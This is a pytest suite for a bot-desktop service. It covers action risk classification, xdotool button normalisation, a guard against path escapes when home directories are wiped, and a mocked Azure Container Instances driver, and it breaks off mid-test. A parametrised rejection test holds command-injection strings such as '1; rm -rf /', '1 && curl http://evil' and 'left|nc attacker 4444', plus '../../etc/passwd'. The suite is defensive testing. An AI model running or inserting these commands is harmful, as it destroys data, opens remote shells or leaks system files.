"""`app.services.desktop` — risk classification, button normalisation, the wipe guard."""

from __future__ import annotations

import ast
import asyncio
import json
import logging
import re
import struct
import uuid
from pathlib import Path
from types import SimpleNamespace

import pytest
from azure.mgmt.containerinstance import models as aci_models

from app.services import desktop as desktop_module
from app.services.desktop import (
    ACI_CONTROL_PORT,
    ACI_STREAM_PORT,
    ACTION_RISKS,
    DEFAULT_ACTION_RISK,
    RISK_ORDER,
    AciStartError,
    DesktopManager,
    aci_container_state,
    aci_group_name,
    aci_is_running,
    aci_name_from_id,
    aci_private_ip,
    aci_start_failure_reason,
    classify_action_risk,
    make_placeholder_png,
    max_risk,
    normalize_button,
    parse_window_line,
    risk_rank,
)

# ---------------------------------------------------------------------------
# classify_action_risk — the single source of truth for desktop risk
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(("action", "expected"), sorted(ACTION_RISKS.items()))
def test_structurally_known_actions_keep_their_class(action, expected):
    assert classify_action_risk(action) == expected


@pytest.mark.parametrize(
    "action", ["frobnicate", "wiggle_the_thing", "", "   ", "unknown_action_42"]
)
def test_an_unrecognised_action_defaults_to_mutate(action):
    assert classify_action_risk(action) == DEFAULT_ACTION_RISK == "mutate"


@pytest.mark.parametrize(
    ("action", "expected"),
    [
        ("send_email", "send"),
        ("submit_form", "send"),
        ("publish_post", "send"),
        ("reply_all", "send"),
        ("share_folder", "send"),
        ("delete_file", "delete"),
        ("wipe_disk", "delete"),
        ("trash_downloads", "delete"),
        ("destroy_vm", "delete"),
        ("purchase_seat", "spend"),
        ("checkout_cart", "spend"),
        ("transfer_funds", "spend"),
        ("pay_invoice", "spend"),
    ],
)
def test_keyword_escalation(action, expected):
    assert classify_action_risk(action) == expected


def test_a_structurally_safe_action_still_escalates_on_a_keyword():
    """`post_screenshot` reads as a screenshot but posts something: it must gate."""
    assert ACTION_RISKS.get("screenshot") == "observe"
    assert classify_action_risk("post_screenshot") == "send"


def test_escalation_is_by_rank_not_by_keyword_table_order():
    """`delete_invoice` matches both the delete and the spend group; delete wins."""
    assert classify_action_risk("delete_invoice") == "delete"
    assert classify_action_risk("invoice_delete") == "delete"
    assert risk_rank("delete") > risk_rank("spend") > risk_rank("send")


def test_classification_is_case_and_whitespace_insensitive():
    assert classify_action_risk("  SEND_EMAIL  ") == "send"
    assert classify_action_risk("Delete_File") == "delete"


def test_classification_never_downgrades_a_structural_reading():
    for action, structural in ACTION_RISKS.items():
        assert risk_rank(classify_action_risk(action)) >= risk_rank(structural)


def test_the_risk_vocabulary_is_ordered_least_to_most_dangerous():
    assert RISK_ORDER == ("observe", "draft", "mutate", "send", "spend", "delete")
    assert [risk_rank(r) for r in RISK_ORDER] == sorted(risk_rank(r) for r in RISK_ORDER)


def test_max_risk_over_an_arbitrary_number_of_labels():
    assert max_risk("observe") == "observe"
    assert max_risk("observe", "draft", "mutate") == "mutate"
    assert max_risk("send", "delete", "observe") == "delete"


def test_an_unknown_risk_label_ranks_as_mutate():
    assert risk_rank("who_knows") == risk_rank("mutate")


# ---------------------------------------------------------------------------
# normalize_button — untrusted input reaches an xdotool command line
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("left", "1"), ("l", "1"), ("1", "1"), (1, "1"),
        ("middle", "2"), ("m", "2"), ("2", "2"), (2, "2"),
        ("right", "3"), ("r", "3"), ("3", "3"), (3, "3"),
        ("scroll_up", "4"), ("scroll-up", "4"), ("scroll up", "4"), ("4", "4"),
        ("scroll_down", "5"), ("SCROLL-DOWN", "5"), ("5", "5"),
        ("LEFT", "1"), ("  Right  ", "3"),
    ],
)
def test_known_buttons_map_to_xdotool_numbers(value, expected):
    assert normalize_button(value) == expected


@pytest.mark.parametrize(
    "value",
    [
        None,
        "",
        "   ",
        "9",
        "0",
        "-1",
        "999999999999",
        "1; rm -rf /",
        "$(reboot)",
        "`id`",
        "1 && curl http://evil",
        "left|nc attacker 4444",
        "../../etc/passwd",
        "1\nkey Return",
        {"button": "left"},
        ["left"],
        3.5,
        True,
    ],
)
def test_garbage_and_injection_attempts_fall_back_to_the_primary_button(value):
    result = normalize_button(value)
    assert result == "1"
    assert result.isdigit(), "only a bare number may reach the sidecar"


def test_normalize_button_always_returns_a_single_digit():
    for value in ("left", "middle", "right", "scroll_up", "scroll_down", "nonsense", None):
        assert normalize_button(value) in {"1", "2", "3", "4", "5"}


# ---------------------------------------------------------------------------
# parse_window_line
# ---------------------------------------------------------------------------


def test_parse_a_wmctrl_line():
    window = parse_window_line("0x03400005  0 nesq-desktop Chromium - Nesq Bot")
    assert window == {
        "id": "0x03400005",
        "desktop": "0",
        "host": "nesq-desktop",
        "title": "Chromium - Nesq Bot",
    }


def test_parse_a_short_line_fills_the_missing_keys():
    assert parse_window_line("0x01") == {"id": "0x01", "desktop": "", "host": "", "title": ""}


def test_parse_passes_a_dict_through():
    assert parse_window_line({"id": 1, "title": "x"}) == {"id": "1", "title": "x"}


def test_parse_an_empty_line():
    assert parse_window_line("") == {"id": "", "desktop": "", "host": "", "title": ""}


# ---------------------------------------------------------------------------
# The home-wipe path-escape guard
# ---------------------------------------------------------------------------


@pytest.fixture
def manager(tmp_path, monkeypatch):
    mgr = DesktopManager()
    mgr.settings = mgr.settings.model_copy(update={"bot_desktop_home_root": str(tmp_path / "homes")})
    (tmp_path / "homes").mkdir()
    return mgr


def test_home_dir_resolves_under_the_configured_root(manager):
    bot_id = uuid.uuid4()
    home = manager._home_dir(bot_id)
    assert home is not None
    assert home.name == str(bot_id)
    assert Path(manager.settings.bot_desktop_home_root).resolve() in home.parents


@pytest.mark.parametrize(
    "escape",
    [
        "..",
        "../..",
        "../../../etc",
        "/etc",
        "/",
        ".",
        "",
    ],
)
def test_home_dir_refuses_a_path_that_escapes_the_root(manager, escape):
    assert manager._home_dir(escape) is None


def test_wipe_refuses_to_delete_outside_the_root(manager, tmp_path):
    victim = tmp_path / "precious.txt"
    victim.write_text("do not delete me")

    assert manager._wipe_home("..") is False
    assert manager._wipe_home("/") is False
    assert manager._wipe_home("../..") is False
    assert victim.exists(), "the guard let a wipe escape the desktop home root"
    assert (tmp_path / "homes").exists()


def test_wipe_removes_a_legitimate_home(manager):
    bot_id = uuid.uuid4()
    home = manager._home_dir(bot_id)
    home.mkdir(parents=True)
    (home / "file.txt").write_text("data")

    assert manager._wipe_home(bot_id) is True
    assert not home.exists()
    assert Path(manager.settings.bot_desktop_home_root).exists(), "the root itself must survive"


def test_wiping_a_home_that_does_not_exist_is_false_not_an_error(manager):
    assert manager._wipe_home(uuid.uuid4()) is False


def test_the_root_itself_can_never_be_wiped(manager):
    root = Path(manager.settings.bot_desktop_home_root).resolve()
    assert manager._home_dir(root.name) is None or manager._home_dir(root.name) != root


# ---------------------------------------------------------------------------
# The placeholder PNG
# ---------------------------------------------------------------------------


def test_the_placeholder_png_is_a_valid_png():
    png = make_placeholder_png(32, 16)
    assert png.startswith(b"\x89PNG\r\n\x1a\n")
    assert png.endswith(b"IEND\xaeB`\x82")

    # IHDR is the first chunk and carries the requested dimensions.
    length = struct.unpack(">I", png[8:12])[0]
    assert png[12:16] == b"IHDR"
    width, height = struct.unpack(">II", png[16:24])
    assert (width, height) == (32, 16)
    assert length == 13


def test_the_placeholder_png_is_small():
    png = make_placeholder_png(320, 200)
    assert len(png) < 100_000, "a smooth gradient would blow up the payload"


# ---------------------------------------------------------------------------
# One implementation, two homes
#
# The vocabulary and the classifier moved to `app.services.risk` when MCP tool
# calls started being gated by the same rule. `app.services.desktop` re-exports
# them so `routers.desktop` and this suite keep working. The point of these
# tests is that it is a re-export and not a copy — a second implementation is
# exactly how a gate silently stops applying on one path.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "name",
    [
        "ACTION_RISKS",
        "DEFAULT_ACTION_RISK",
        "RISK_KEYWORDS",
        "RISK_ORDER",
        "RISK_RANK",
        "classify_action_risk",
        "max_risk",
        "risk_rank",
    ],
)
def test_the_desktop_module_re_exports_rather_than_redefines(name):
    from app.services import desktop as desktop_module
    from app.services import risk as risk_module

    assert getattr(desktop_module, name) is getattr(risk_module, name)


def test_only_one_module_defines_the_classifier():
    """A grep-level guard: `def classify_action_risk` must appear exactly once."""
    services = Path(__file__).resolve().parents[2] / "app" / "services"
    definitions = [
        path.name
        for path in sorted(services.rglob("*.py"))
        if "def classify_action_risk" in path.read_text(encoding="utf-8")
    ]
    assert definitions == ["risk.py"], f"the classifier is defined in {definitions}"


def test_the_simulation_chokepoint_uses_the_same_classifier():
    from app.services import risk as risk_module
    from app.services import simulation

    assert simulation.classify_action_risk is risk_module.classify_action_risk
    assert simulation.max_risk is risk_module.max_risk


# ===========================================================================
# The Azure Container Instances driver
#
# Nothing here talks to Azure. The *models* are the real ones from
# azure-mgmt-containerinstance — a typo in a field name has to fail here rather
# than at 2am against ARM — but the management client is a fake that records
# what it was asked to do and replays container group states back.
#
# What these guard, in order of what it would cost to get wrong:
#
# 1. One container group per bot, never shared. Per-bot isolation is the
#    product claim (docs/competitive-analysis.md); a competing agent product's shared machine is
#    what we are not.
# 2. No public IP, ever. A Bot Desktop is a real browser driven by an LLM over
#    hostile content.
# 3. The registry pull uses a user-assigned identity, never a username and
#    password.
# 4. The sidecar token is a *secure* value and reaches no dict, no log, no
#    error message.
# ===========================================================================

SIDECAR_TOKEN = "sidecar-tok-must-never-be-echoed-91af3c"
SUBSCRIPTION = "11111111-2222-3333-4444-555555555555"
RESOURCE_GROUP = "nesq-prod-rg"
SUBNET_ID = (
    f"/subscriptions/{SUBSCRIPTION}/resourceGroups/{RESOURCE_GROUP}/providers"
    "/Microsoft.Network/virtualNetworks/nesq-vnet/subnets/bot-desktops"
)
IDENTITY_ID = (
    f"/subscriptions/{SUBSCRIPTION}/resourceGroups/{RESOURCE_GROUP}/providers"
    "/Microsoft.ManagedIdentity/userAssignedIdentities/nesq-desktop-puller"
)
REGISTRY = "nesqacrprod.azurecr.io"
IMAGE = f"{REGISTRY}/nesqbot/bot-desktop:v0.2.0"
PRIVATE_IP = "10.40.2.7"


def arm_id(name: str) -> str:
    return (
        f"/subscriptions/{SUBSCRIPTION}/resourceGroups/{RESOURCE_GROUP}"
        f"/providers/Microsoft.ContainerInstance/containerGroups/{name}"
    )


def fake_group(
    *,
    state: str = "Running",
    ip: str | None = PRIVATE_IP,
    container_state: str | None = None,
    detail: str = "",
    events: tuple[tuple[str, str], ...] = (),
    name: str = "nesq-desktop-x",
):
    """A container group as `container_groups.get()` would hand it back."""
    container = SimpleNamespace(
        name="desktop",
        instance_view=SimpleNamespace(
            current_state=SimpleNamespace(
                state=state if container_state is None else container_state,
                detail_status=detail,
            ),
            events=[SimpleNamespace(name=n, message=m) for n, m in events],
        ),
    )
    return SimpleNamespace(
        id=arm_id(name),
        name=name,
        instance_view=SimpleNamespace(state=state),
        ip_address=SimpleNamespace(ip=ip) if ip else None,
        containers=[container],
    )


class FakePoller:
    def __init__(self, error: Exception | None = None):
        self.waited: list[float | None] = []
        self._error = error

    def wait(self, timeout=None):
        self.waited.append(timeout)
        if self._error:
            raise self._error


class FakeContainerGroups:
    """Records every management call and replays a scripted sequence of states."""

    def __init__(self, states=None, *, fail_on: str | None = None):
        self.created: list[tuple[str, str, object]] = []
        self.deleted: list[tuple[str, str]] = []
        self.stopped: list[tuple[str, str]] = []
        self.started: list[tuple[str, str]] = []
        self.gets: list[tuple[str, str]] = []
        self.pollers: list[FakePoller] = []
        self._states = list(states) if states is not None else [fake_group()]
        self._fail_on = fail_on

    def _boom(self, op: str) -> None:
        if self._fail_on == op:
            raise RuntimeError(f"azure said no to {op}")

    def _poller(self) -> FakePoller:
        poller = FakePoller()
        self.pollers.append(poller)
        return poller

    def begin_create_or_update(self, resource_group, name, definition):
        self._boom("create")
        self.created.append((resource_group, name, definition))
        return self._poller()

    def get(self, resource_group, name):
        self.gets.append((resource_group, name))
        self._boom("get")
        if not self._states:
            raise RuntimeError("the fake ran out of scripted states")
        group = self._states[0] if len(self._states) == 1 else self._states.pop(0)
        # ARM answers about the group you asked for, so the id it returns is the
        # id of *that* name. The driver stores it and later derives the name back
        # out of it, which only holds if the two agree.
        group.name = name
        group.id = arm_id(name)
        return group

    def begin_delete(self, resource_group, name):
        self._boom("delete")
        self.deleted.append((resource_group, name))
        return self._poller()

    def stop(self, resource_group, name):
        self._boom("stop")
        self.stopped.append((resource_group, name))

    def begin_start(self, resource_group, name):
        self._boom("start")
        self.started.append((resource_group, name))
        return self._poller()


def aci_manager(monkeypatch, groups: FakeContainerGroups, **overrides):
    """A `DesktopManager` in aci mode wired to a fake management client."""
    manager = DesktopManager()
    values = {
        "bot_desktop_mode": "aci",
        "bot_desktop_image": IMAGE,
        "aci_subscription_id": SUBSCRIPTION,
        "aci_resource_group": RESOURCE_GROUP,
        "aci_region": "swedencentral",
        "aci_subnet_id": SUBNET_ID,
        "aci_cpu": 2.0,
        "aci_memory_gb": 4.0,
        "aci_registry_server": REGISTRY,
        "aci_registry_identity": IDENTITY_ID,
        "aci_start_timeout_seconds": 30,
        "nesq_sidecar_token": SIDECAR_TOKEN,
    }
    values.update(overrides)
    manager.settings = manager.settings.model_copy(update=values)
    monkeypatch.setattr(manager, "_aci_client", lambda: SimpleNamespace(container_groups=groups))
    monkeypatch.setattr(desktop_module, "ACI_POLL_INTERVAL_SECONDS", 0)
    return manager


def a_bot(slug: str = "sales_ops", bot_id: str = "0f6c1d2e-3a4b-4c5d-8e9f-a0b1c2d3e4f5"):
    return SimpleNamespace(id=uuid.UUID(bot_id), slug=slug, desktop_profile="xfce")


def scalars(obj, path: str = "") -> list[tuple[str, str]]:
    """Every string/number in a model tree, with the path that reached it."""
    if isinstance(obj, (str, int, float, bool)):
        return [(path, str(obj))]
    if obj is None:
        return []
    if isinstance(obj, dict):
        return [item for k, v in obj.items() for item in scalars(v, f"{path}.{k}")]
    if isinstance(obj, (list, tuple)):
        return [item for i, v in enumerate(obj) for item in scalars(v, f"{path}[{i}]")]
    attrs = getattr(obj, "__dict__", None)
    if not attrs:
        return []
    return [item for k, v in attrs.items() for item in scalars(v, f"{path}.{k}")]


def env_of(container) -> dict[str, aci_models.EnvironmentVariable]:
    return {var.name: var for var in container.environment_variables}


# ---------------------------------------------------------------------------
# Group naming — the isolation boundary is a name that is never reused
# ---------------------------------------------------------------------------


def test_the_group_name_is_deterministic_for_a_bot():
    bot = a_bot()
    assert aci_group_name(bot) == aci_group_name(a_bot())
    assert aci_group_name(bot).startswith("nesq-desktop-")


def test_the_group_name_survives_a_slug_azure_would_reject():
    """ACI names are lowercase alphanumerics and hyphens; slugs are not."""
    name = aci_group_name(a_bot(slug="Sales Ops / EMEA_2026!"))
    assert re.fullmatch(r"[a-z0-9]([a-z0-9-]*[a-z0-9])?", name), name
    assert len(name) <= 63
    assert "sales-ops" in name


def test_two_bots_whose_slugs_sanitise_alike_still_get_their_own_group():
    """`Sales Ops` and `sales-ops` must not land on the same container group."""
    left = aci_group_name(a_bot(slug="Sales Ops", bot_id="11111111-1111-4111-8111-111111111111"))
    right = aci_group_name(a_bot(slug="sales-ops", bot_id="22222222-2222-4222-8222-222222222222"))
    assert left != right


def test_a_very_long_slug_is_truncated_into_a_legal_name():
    name = aci_group_name(a_bot(slug="x" * 200))
    assert len(name) <= 63
    assert re.fullmatch(r"[a-z0-9]([a-z0-9-]*[a-z0-9])?", name), name


def test_an_empty_slug_still_produces_a_usable_name():
    name = aci_group_name(SimpleNamespace(slug="", id=uuid.uuid4()))
    assert name.startswith("nesq-desktop-")
    assert re.fullmatch(r"[a-z0-9]([a-z0-9-]*[a-z0-9])?", name), name


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        (arm_id("nesq-desktop-sales"), "nesq-desktop-sales"),
        ("nesq-desktop-sales", "nesq-desktop-sales"),
        (arm_id("nesq-desktop-sales") + "/", "nesq-desktop-sales"),
        (None, ""),
        ("", ""),
    ],
)
def test_the_group_name_can_be_recovered_from_whatever_container_id_holds(value, expected):
    assert aci_name_from_id(value) == expected


# ---------------------------------------------------------------------------
# The container group definition
# ---------------------------------------------------------------------------


@pytest.fixture
def definition(monkeypatch):
    manager = aci_manager(monkeypatch, FakeContainerGroups())
    bot = a_bot()
    return manager._aci_container_group(bot, aci_group_name(bot))


def test_the_group_holds_exactly_one_container(definition):
    """One bot, one container group, one desktop inside it."""
    assert len(definition.containers) == 1
    assert definition.containers[0].name == "desktop"
    assert definition.os_type == "Linux"
    assert definition.location == "swedencentral"


def test_the_container_runs_the_configured_image_at_the_configured_size(definition):
    container = definition.containers[0]
    assert container.image == IMAGE
    assert container.resources.requests.cpu == 2.0
    assert container.resources.requests.memory_in_gb == 4.0


def test_both_ports_are_published_on_the_container_and_the_group(definition):
    assert sorted(p.port for p in definition.containers[0].ports) == [
        ACI_STREAM_PORT,
        ACI_CONTROL_PORT,
    ]
    assert sorted(p.port for p in definition.ip_address.ports) == [
        ACI_STREAM_PORT,
        ACI_CONTROL_PORT,
    ]


def test_the_group_is_private_and_lands_in_the_delegated_subnet(definition):
    assert definition.ip_address.type == "Private"
    assert definition.ip_address.dns_name_label is None
    assert [s.id for s in definition.subnet_ids] == [SUBNET_ID]


def test_no_part_of_the_definition_ever_asks_for_a_public_address(definition):
    """The one thing that must never regress: a desktop on the internet."""
    values = scalars(definition)
    assert not [
        (path, value) for path, value in values if value.lower() == "public"
    ], "something in the container group asked for a public IP"
    assert not [path for path, _ in values if "dns_name_label" in path]


def test_the_pull_uses_the_user_assigned_identity_and_no_password(definition):
    credentials = definition.image_registry_credentials
    assert [c.server for c in credentials] == [REGISTRY]
    assert [c.identity for c in credentials] == [IDENTITY_ID]
    assert all(c.username is None and c.password is None for c in credentials)

    assert definition.identity.type == "UserAssigned"
    assert list(definition.identity.user_assigned_identities) == [IDENTITY_ID]


def test_the_group_is_tagged_the_way_the_docker_driver_labels(definition):
    bot = a_bot()
    assert definition.tags["nesqbot.bot_id"] == str(bot.id)
    assert definition.tags["nesqbot.role"] == "bot-desktop"
    assert definition.tags["nesqbot.bot_slug"] == bot.slug


def test_the_image_contract_environment_is_passed_through(definition):
    env = env_of(definition.containers[0])
    assert env["BOT_SLUG"].value == "sales_ops"
    assert env["DESKTOP_PROFILE"].value == "xfce"
    assert env["NESQ_STREAM_PORT"].value == str(ACI_STREAM_PORT)
    assert env["NESQ_SIDECAR_PORT"].value == str(ACI_CONTROL_PORT)


def test_the_sidecar_token_is_a_secure_value_and_nothing_else(definition):
    """`secure_value` is write-only in ARM: absent from `az container show`."""
    env = env_of(definition.containers[0])
    assert env["NESQ_SIDECAR_TOKEN"].secure_value == SIDECAR_TOKEN
    assert env["NESQ_SIDECAR_TOKEN"].value is None

    where = [path for path, value in scalars(definition) if SIDECAR_TOKEN in value]
    assert where == [".containers[0].environment_variables[5].secure_value"], (
        f"the token reached {where}"
    )


def test_the_vnc_password_is_also_secure(definition):
    env = env_of(definition.containers[0])
    assert env["VNC_PW"].secure_value
    assert env["VNC_PW"].value is None


def test_no_token_variable_at_all_when_none_is_configured(monkeypatch):
    manager = aci_manager(monkeypatch, FakeContainerGroups(), nesq_sidecar_token="")
    bot = a_bot()
    definition = manager._aci_container_group(bot, aci_group_name(bot))
    assert "NESQ_SIDECAR_TOKEN" not in env_of(definition.containers[0])


def test_nothing_is_mounted_so_the_filesystem_dies_with_the_group(definition):
    """The honest shape of ACI: no volume, therefore every stop is a wipe.

    An Azure Files mount is the only ACI volume that would outlive the group,
    and mounting one needs a storage account *key* in configuration. This
    driver holds no such credential, so it mounts nothing — and `stop` is
    documented as destructive rather than pretending otherwise.
    """
    assert definition.volumes is None
    assert definition.containers[0].volume_mounts is None


# ---------------------------------------------------------------------------
# start — the polling loop
# ---------------------------------------------------------------------------


async def test_start_polls_until_the_group_is_running(monkeypatch):
    groups = FakeContainerGroups(
        [
            fake_group(state="Pending", ip=None, events=(("Pulling", "pulling image"),)),
            fake_group(state="Pending", ip=PRIVATE_IP, container_state="Waiting"),
            fake_group(state="Running"),
        ]
    )
    manager = aci_manager(monkeypatch, groups)
    info = await manager._aci_start(a_bot())

    assert len(groups.gets) == 3, "the loop stopped polling before the group was up"
    assert groups.created and groups.created[0][0] == RESOURCE_GROUP
    assert info["container_id"] == arm_id(aci_group_name(a_bot()))


async def test_the_urls_are_built_from_the_private_ip(monkeypatch):
    manager = aci_manager(monkeypatch, FakeContainerGroups())
    info = await manager._aci_start(a_bot())

    assert info["stream_url"] == f"http://{PRIVATE_IP}:{ACI_STREAM_PORT}"
    assert info["control_url"] == f"http://{PRIVATE_IP}:{ACI_CONTROL_PORT}"
    assert "localhost" not in info["stream_url"]


async def test_a_running_group_with_no_address_yet_is_not_ready(monkeypatch):
    """Running arrives before the private IP does; serving without one is a lie."""
    groups = FakeContainerGroups([fake_group(state="Running", ip=None), fake_group()])
    manager = aci_manager(monkeypatch, groups)
    await manager._aci_start(a_bot())
    assert len(groups.gets) == 2


async def test_a_group_that_404s_right_after_the_put_is_polled_again(monkeypatch):
    class Flaky(FakeContainerGroups):
        def get(self, resource_group, name):
            self.gets.append((resource_group, name))
            if len(self.gets) == 1:
                raise RuntimeError("ResourceNotFound")
            return fake_group()

    groups = Flaky()
    manager = aci_manager(monkeypatch, groups)
    info = await manager._aci_start(a_bot())
    assert len(groups.gets) == 2
    assert info["control_url"].endswith(str(ACI_CONTROL_PORT))


async def test_the_group_is_created_once_and_the_bot_owns_it(monkeypatch):
    groups = FakeContainerGroups()
    manager = aci_manager(monkeypatch, groups)
    bot = a_bot()
    await manager._aci_start(bot)

    assert len(groups.created) == 1
    _, name, definition = groups.created[0]
    assert name == aci_group_name(bot)
    assert definition.tags["nesqbot.bot_id"] == str(bot.id)


# ---------------------------------------------------------------------------
# start — the timeout, and naming what went wrong
# ---------------------------------------------------------------------------


async def test_a_start_that_never_comes_up_raises_with_a_diagnosis(monkeypatch):
    groups = FakeContainerGroups(
        [
            fake_group(
                state="Pending",
                ip=None,
                container_state="Waiting",
                events=(("Pulling", "pulling image nesqbot/bot-desktop"),),
            )
        ]
    )
    manager = aci_manager(monkeypatch, groups, aci_start_timeout_seconds=0)

    with pytest.raises(AciStartError) as caught:
        await manager._aci_start(a_bot())

    message = str(caught.value)
    assert "still pulling" in message
    assert IMAGE in message
    assert "az container show" in message
    assert caught.value.container_id == arm_id(aci_group_name(a_bot()))


@pytest.mark.parametrize(
    ("group", "expected"),
    [
        (None, "never returned the container group"),
        (
            fake_group(
                state="Pending",
                ip=None,
                container_state="Waiting",
                events=(("Pulling", "pulling image"),),
            ),
            "still pulling",
        ),
        (
            fake_group(
                state="Pending",
                ip=None,
                container_state="Waiting",
                detail="Failed to pull image: unauthorized",
            ),
            "pull was refused",
        ),
        (
            fake_group(
                state="Pending",
                ip=None,
                container_state="Waiting",
                events=(("Failed", "denied: requested access to the resource is denied"),),
            ),
            "pull was refused",
        ),
        (
            fake_group(
                state="Pending",
                ip=None,
                container_state="Terminated",
                detail="Error",
                events=(("Pulled", "image pulled"),),
            ),
            "started and then exited",
        ),
        (fake_group(state="Running", ip=None), "no private IP"),
        (fake_group(state="Pending", ip=None, container_state="", events=()), "no container event"),
    ],
)
def test_the_failure_reason_says_which_half_broke(group, expected):
    reason = aci_start_failure_reason(group, IMAGE, 180.0)
    assert expected in reason


def test_a_pull_refusal_points_at_the_identity_not_the_image_tag_alone():
    reason = aci_start_failure_reason(
        fake_group(
            state="Pending",
            ip=None,
            container_state="Waiting",
            detail="Failed to pull image: unauthorized",
        ),
        IMAGE,
        180.0,
    )
    assert "AcrPull" in reason
    assert "aci_registry_identity" in reason
    assert IMAGE in reason


def test_an_unrecognisable_state_still_reports_what_it_saw():
    reason = aci_start_failure_reason(
        fake_group(state="Repairing", ip=None, container_state="Weird", detail="huh"),
        IMAGE,
        90.0,
    )
    assert "Repairing" in reason and "Weird" in reason and "90s" in reason


# ---------------------------------------------------------------------------
# The lifecycle through DesktopManager, against a real BotDesktop row
# ---------------------------------------------------------------------------


async def test_start_records_running_with_the_private_urls(db, bot_a, monkeypatch):
    manager = aci_manager(monkeypatch, FakeContainerGroups())
    desktop = await manager.start(db, bot_a)

    assert desktop.state == "running"
    assert desktop.container_id == arm_id(aci_group_name(bot_a))
    assert desktop.stream_url == f"http://{PRIVATE_IP}:{ACI_STREAM_PORT}"
    assert desktop.control_url == f"http://{PRIVATE_IP}:{ACI_CONTROL_PORT}"
    assert desktop.last_error is None


async def test_a_timeout_lands_as_error_state_and_never_raises(db, bot_a, monkeypatch):
    groups = FakeContainerGroups([fake_group(state="Pending", ip=None, container_state="Waiting")])
    manager = aci_manager(monkeypatch, groups, aci_start_timeout_seconds=0)

    desktop = await manager.start(db, bot_a)

    assert desktop.state == "error"
    assert "did not serve within" in desktop.last_error
    # The group is left behind on purpose, so the row keeps a handle to it: it
    # is the evidence, and it bills until something stops it.
    assert desktop.container_id == arm_id(aci_group_name(bot_a))
    assert "bills until it is stopped" in desktop.last_error


async def test_an_azure_error_on_create_lands_as_error_state(db, bot_a, monkeypatch):
    manager = aci_manager(monkeypatch, FakeContainerGroups(fail_on="create"))
    desktop = await manager.start(db, bot_a)

    assert desktop.state == "error"
    assert "azure said no to create" in desktop.last_error


async def test_stop_deletes_the_container_group(db, bot_a, monkeypatch):
    groups = FakeContainerGroups()
    manager = aci_manager(monkeypatch, groups)
    await manager.start(db, bot_a)

    desktop = await manager.stop(db, bot_a.id)

    assert groups.deleted == [(RESOURCE_GROUP, aci_group_name(bot_a))]
    assert groups.pollers[-1].waited == [desktop_module.ACI_DELETE_WAIT_SECONDS]
    assert desktop.state == "absent"
    assert desktop.container_id is None
    assert desktop.stream_url is None and desktop.control_url is None


async def test_stop_with_wipe_touches_no_local_home_because_there_is_none(
    db, bot_a, monkeypatch, tmp_path, caplog
):
    """Deleting the group deletes the filesystem: there is nothing left to wipe."""
    groups = FakeContainerGroups()
    manager = aci_manager(monkeypatch, groups, bot_desktop_home_root=str(tmp_path / "homes"))
    (tmp_path / "homes").mkdir()
    await manager.start(db, bot_a)

    with caplog.at_level(logging.INFO, logger="app.services.desktop"):
        desktop = await manager.stop(db, bot_a.id, wipe=True)

    assert desktop.state == "absent"
    assert groups.deleted
    assert "went with the group" in caplog.text
    assert "did not complete" not in caplog.text, "the docker wipe warning is misleading here"


async def test_a_delete_that_fails_still_leaves_the_desktop_absent(db, bot_a, monkeypatch):
    """Teardown never fails a request; the operator gets a log, not a 500."""
    manager = aci_manager(monkeypatch, FakeContainerGroups(fail_on="delete"))
    await manager.start(db, bot_a)
    desktop = await manager.stop(db, bot_a.id)
    assert desktop.state == "absent"


# ---------------------------------------------------------------------------
# suspend / resume — the mapping, and where it does not fit
# ---------------------------------------------------------------------------


async def test_suspend_maps_to_an_aci_stop(db, bot_a, monkeypatch):
    groups = FakeContainerGroups()
    manager = aci_manager(monkeypatch, groups)
    await manager.start(db, bot_a)

    desktop = await manager.suspend(db, bot_a.id)

    assert groups.stopped == [(RESOURCE_GROUP, aci_group_name(bot_a))]
    assert groups.deleted == [], "suspend must keep the group definition"
    assert desktop.state == "suspended"
    assert desktop.container_id == arm_id(aci_group_name(bot_a))


async def test_suspend_drops_the_urls_because_the_address_is_released(db, bot_a, monkeypatch):
    """Azure reuses private IPs. A stale URL could point at another bot's desktop."""
    manager = aci_manager(monkeypatch, FakeContainerGroups())
    await manager.start(db, bot_a)

    desktop = await manager.suspend(db, bot_a.id)

    assert desktop.stream_url is None
    assert desktop.control_url is None


async def test_a_suspend_azure_refuses_is_an_error_not_a_quiet_suspension(db, bot_a, monkeypatch):
    """A failed stop means the group is still running — and still billing."""
    groups = FakeContainerGroups()
    manager = aci_manager(monkeypatch, groups)
    await manager.start(db, bot_a)
    groups._fail_on = "stop"

    desktop = await manager.suspend(db, bot_a.id)

    assert desktop.state == "error"
    assert "azure said no to stop" in desktop.last_error


async def test_resume_maps_to_an_aci_start_and_re_reads_the_address(db, bot_a, monkeypatch):
    """A resumed group is a cold boot and may come back on a different IP."""
    groups = FakeContainerGroups()
    manager = aci_manager(monkeypatch, groups)
    await manager.start(db, bot_a)
    await manager.suspend(db, bot_a.id)

    groups._states = [fake_group(ip="10.40.9.99")]
    desktop = await manager.resume(db, bot_a.id)

    assert groups.started == [(RESOURCE_GROUP, aci_group_name(bot_a))]
    assert desktop.state == "running"
    assert desktop.stream_url == f"http://10.40.9.99:{ACI_STREAM_PORT}"
    assert desktop.control_url == f"http://10.40.9.99:{ACI_CONTROL_PORT}"


async def test_a_resume_that_never_comes_back_up_is_an_error(db, bot_a, monkeypatch):
    groups = FakeContainerGroups()
    manager = aci_manager(monkeypatch, groups)
    await manager.start(db, bot_a)
    await manager.suspend(db, bot_a.id)

    groups._states = [fake_group(state="Pending", ip=None, container_state="Waiting")]
    manager.settings = manager.settings.model_copy(update={"aci_start_timeout_seconds": 0})

    desktop = await manager.resume(db, bot_a.id)

    assert desktop.state == "error"
    assert "did not serve within" in desktop.last_error


async def test_resume_only_acts_on_a_suspended_desktop(db, bot_a, monkeypatch):
    groups = FakeContainerGroups()
    manager = aci_manager(monkeypatch, groups)
    await manager.start(db, bot_a)

    desktop = await manager.resume(db, bot_a.id)

    assert desktop.state == "running"
    assert groups.started == []


# ---------------------------------------------------------------------------
# Configuration guards — refuse rather than deploy something unsafe
# ---------------------------------------------------------------------------


async def test_a_missing_subnet_refuses_to_start_rather_than_take_a_public_ip(
    db, bot_a, monkeypatch
):
    groups = FakeContainerGroups()
    manager = aci_manager(monkeypatch, groups, aci_subnet_id="")

    desktop = await manager.start(db, bot_a)

    assert desktop.state == "error"
    assert "public IP" in desktop.last_error
    assert groups.created == [], "nothing may be created without a subnet"


async def test_a_registry_without_an_identity_refuses_rather_than_ask_for_a_password(
